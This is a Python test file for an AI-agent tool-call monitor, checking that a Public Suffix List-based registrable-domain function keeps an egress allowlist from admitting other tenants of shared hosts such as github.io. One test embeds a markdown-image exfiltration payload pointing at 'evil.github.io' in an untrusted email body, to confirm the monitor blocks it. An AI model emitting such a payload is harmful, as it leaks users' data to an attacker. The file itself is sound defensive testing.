"""Public Suffix List behind `registrable_domain` (G4, #300) and its effect on the egress rule."""

import importlib.util
from collections.abc import Callable
from pathlib import Path
from typing import cast

import pytest
from hypothesis import given
from hypothesis import strategies as st

from notary_core.models import (
    FreeMarker,
    IntentContract,
    ResolvedValue,
    SessionState,
    ToolCallProposal,
    ToolScope,
)
from notary_core.monitor import decide
from notary_core.policy.sensitive_params import DEFAULT_POLICY
from notary_core.units import _public_suffixes
from notary_core.units.host import canonicalize_host, registrable_domain


@pytest.fixture
def run_egress(
    make_scope: Callable[..., ToolScope],
    make_contract: Callable[..., IntentContract],
    make_proposal: Callable[..., ToolCallProposal],
    make_session: Callable[..., SessionState],
    make_value: Callable[..., ResolvedValue],
) -> Callable[[str, tuple[str, ...]], tuple[str, list[tuple[str, str]]]]:
    """Run the real monitor on a `send_email` whose untrusted body is given."""

    def run(body: str, egress: tuple[str, ...]) -> tuple[str, list[tuple[str, str]]]:
        values = {
            "to": make_value("v-to", "bob@acme.example", unit="email"),
            "subject": make_value("v-subject", "hi"),
            "body": make_value("v-body", body, origin="email", integrity="untrusted"),
        }
        params = {name: FreeMarker(kind="free") for name in values}
        scope = make_scope("send_email", params=params)
        contract = make_contract(tools=(scope,), egress_hosts=egress)
        decision = decide(
            contract,
            make_proposal("send_email", **values),
            {v.ref.id: v for v in values.values()},
            (),
            make_session(),
            policy=DEFAULT_POLICY,
        )
        failed = [(r.check, r.code) for r in decision.reasons if r.outcome == "fail"]
        return decision.verdict, failed

    return run


@pytest.mark.attack("A5")
def test_tenants_of_a_shared_hosting_suffix_have_different_registrable_domains() -> None:
    assert registrable_domain("a.github.io") == "a.github.io"
    assert registrable_domain("b.github.io") == "b.github.io"
    assert registrable_domain("www.a.github.io") == "a.github.io"


@pytest.mark.attack("A5")
def test_allowlist_for_one_tenant_does_not_admit_another_through_decide(
    run_egress: Callable[[str, tuple[str, ...]], tuple[str, list[tuple[str, str]]]],
) -> None:
    allowed = ("alice.github.io",)
    assert run_egress("see https://alice.github.io/x", allowed)[0] == "ALLOW"
    assert run_egress("see https://docs.alice.github.io/x", allowed)[0] == "ALLOW"
    verdict, failed = run_egress("see ![x](https://evil.github.io/?d=CODE)", allowed)
    assert (verdict, failed) == ("BLOCK", [("confidentiality", "CONF_URL_NOT_ALLOWED")])
    # an entry for the suffix itself admits only the bare suffix host, not its tenants
    assert run_egress("https://evil.github.io/", ("github.io",))[0] == "BLOCK"


@pytest.mark.attack("A5")
@pytest.mark.parametrize(
    ("host", "expected"),
    [
        # ICANN multipart suffixes, including ones the old hand-written list lacked
        ("shop.example.co.uk", "example.co.uk"),
        ("a.b.example.com.au", "example.com.au"),
        ("www.example.com.sg", "example.com.sg"),
        ("x.example.org.za", "example.org.za"),
        # private-section suffixes: every tenant is its own registrable domain
        ("alice.github.io", "alice.github.io"),
        ("docs.alice.github.io", "alice.github.io"),
        ("app.vercel.app", "app.vercel.app"),
        ("x.blogspot.com", "x.blogspot.com"),
        ("bucket.s3.amazonaws.com", "bucket.s3.amazonaws.com"),
        ("a.b.bucket.s3.amazonaws.com", "bucket.s3.amazonaws.com"),
        # ordinary names and unknown TLDs (default "*" rule)
        ("mail.acme.example", "acme.example"),
        ("a.b.c.example.com", "example.com"),
        ("acme.example", "acme.example"),
    ],
)
def test_registrable_domain_follows_the_list(host: str, expected: str) -> None:
    assert registrable_domain(host) == expected


@pytest.mark.attack("A5")
def test_wildcard_and_exception_rules() -> None:
    # "*.ck": every second-level name is itself a suffix; "!www.ck" carves out www.ck
    assert registrable_domain("foo.bar.ck") == "foo.bar.ck"
    assert registrable_domain("bar.ck") == "bar.ck"
    assert registrable_domain("www.ck") == "www.ck"
    assert registrable_domain("sub.www.ck") == "www.ck"
    # "*.kobe.jp" with "!city.kobe.jp"
    assert registrable_domain("a.b.kobe.jp") == "a.b.kobe.jp"
    assert registrable_domain("x.city.kobe.jp") == "city.kobe.jp"
    # the bare TLD of a wildcard rule is not a wildcard match of itself
    assert registrable_domain("ck") == "ck"


@pytest.mark.attack("A5")
@pytest.mark.parametrize(
    "suffix", ["co.uk", "github.io", "com", "ck", "s3.amazonaws.com", "localhost"]
)
def test_a_host_that_is_a_public_suffix_is_returned_as_is(suffix: str) -> None:
    """No registrable domain exists; returning the host means an entry matches only that host."""
    assert registrable_domain(suffix) == suffix


@pytest.mark.attack("A5")
def test_allowlisting_a_suffix_does_not_admit_its_tenants() -> None:
    allowed = {"github.io"}
    for host in ("evil.github.io", "x.evil.github.io"):
        assert host not in allowed
        assert registrable_domain(host) not in allowed


@pytest.mark.attack("A5")
def test_uppercase_and_trailing_dot() -> None:
    assert registrable_domain("Shop.Example.CO.UK") == "example.co.uk"
    assert registrable_domain("a.GitHub.IO.") == "a.github.io"
    assert registrable_domain("example.com.") == "example.com"
    assert canonicalize_host("https://A.GitHub.IO./x").value == "a.github.io"


@pytest.mark.attack("A5")
def test_idn_and_punycode_compare_in_ascii_form() -> None:
    assert registrable_domain("www.münchen.de") == "xn--mnchen-3ya.de"
    assert registrable_domain("www.xn--mnchen-3ya.de") == "xn--mnchen-3ya.de"
    # IDN suffix: the rule is stored in punycode ("xn--fiqs8s" is the TLD cn in Chinese)
    assert registrable_domain("shop.example.中国") == "example.xn--fiqs8s"
    assert registrable_domain("shop.example.xn--fiqs8s") == "example.xn--fiqs8s"
    # the canonical form of a unicode URL host is already punycode
    canonical = canonicalize_host("https://Shop.Example.中国/").value
    assert registrable_domain(canonical) == "example.xn--fiqs8s"


@pytest.mark.attack("A5")
def test_ip_literals_and_single_labels() -> None:
    assert registrable_domain("127.0.0.1") == "127.0.0.1"
    assert registrable_domain("10.0.0.255") == "10.0.0.255"
    assert registrable_domain("[::1]") == "[::1]"
    assert registrable_domain("[2001:db8::1]") == "[2001:db8::1]"
    assert registrable_domain("localhost") == "localhost"
    assert registrable_domain("intranet") == "intranet"


_PIECES = [
    "co", "uk", "com", "au", "github", "io", "ck", "www", "kobe", "jp", "city", "s3",
    "amazonaws", "vercel", "app", "a", "b", "acme", "example", "xn--fiqs8s",
]  # fmt: skip
_hosts = st.lists(
    st.one_of(st.sampled_from(_PIECES), st.from_regex(r"[a-z0-9]{1,6}", fullmatch=True)),
    min_size=1,
    max_size=6,
).map(".".join)


@pytest.mark.attack("A5")
@given(_hosts)
def test_registrable_domain_is_a_label_suffix_and_idempotent(host: str) -> None:
    result = registrable_domain(host)
    labels = host.split(".")
    result_labels = result.split(".")
    assert labels[len(labels) - len(result_labels) :] == result_labels
    assert registrable_domain(result) == result


@pytest.mark.attack("A5")
@given(_hosts, st.from_regex(r"[a-z0-9]{1,6}", fullmatch=True))
def test_subdomains_share_the_registrable_domain(host: str, extra: str) -> None:
    assert registrable_domain(f"{extra}.{host}") in {registrable_domain(host), f"{extra}.{host}"}


# --- embedded data -------------------------------------------------------------------------------

_CORE = Path(__file__).resolve().parents[1]


def _load_generator() -> object:
    path = _CORE / "scripts" / "gen_public_suffixes.py"
    spec = importlib.util.spec_from_file_location("gen_public_suffixes", path)
    assert spec is not None
    assert spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


@pytest.mark.attack("A5")
def test_embedded_module_is_what_the_generator_produces_from_the_vendored_list() -> None:
    generator = _load_generator()
    render = cast("Callable[[str], str]", getattr(generator, "render"))  # noqa: B009
    dat = (_CORE / "data" / "public_suffix_list.dat").read_text(encoding="utf-8")
    generated = (_CORE / "src" / "notary_core" / "units" / "_public_suffixes.py").read_text(
        encoding="utf-8"
    )
    assert render(dat) == generated


@pytest.mark.attack("A5")
def test_snapshot_is_pinned_and_sections_stay_distinguishable() -> None:
    assert _public_suffixes.PSL_VERSION[:4].isdigit()
    assert len(_public_suffixes.PSL_COMMIT) == 40
    assert "co.uk" in _public_suffixes.ICANN_RULES
    assert "github.io" in _public_suffixes.PRIVATE_RULES
    assert "github.io" not in _public_suffixes.ICANN_RULES
    assert "*.ck" in _public_suffixes.ICANN_RULES
    assert "!www.ck" in _public_suffixes.ICANN_RULES
    for rule in _public_suffixes.ICANN_RULES | _public_suffixes.PRIVATE_RULES:
        assert rule.isascii()
        assert rule == rule.lower()
